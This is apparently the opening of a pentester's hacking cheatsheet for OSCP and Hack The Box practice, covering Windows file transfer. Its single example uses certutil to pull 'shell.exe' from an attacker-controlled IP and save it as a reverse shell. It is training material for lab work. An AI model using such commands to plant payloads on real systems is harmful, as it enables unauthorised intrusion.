# Hacking-Cheatsheet
In this repo I collect all commands, links, techniques and tricks i found during my work as pentester, hacker, OSCP student and hack the box fan.

- [File Transfer and File Downloads](#file-transfer-and-file-downloads)
  - [Windows](#windows)
  - [Download Files with Certutil](#download-files-with-certutil)


# File Transfer and File Downloads

## Windows
### Download Files with Certutil
```bash
certutil.exe -urlcache -f http://<ip>:<port>/<filename> <localfilename>
```
Example:
```bash
certutil.exe -urlcache -f http://10.10.14.37:8080/shell.exe reverse_shell.exe
```
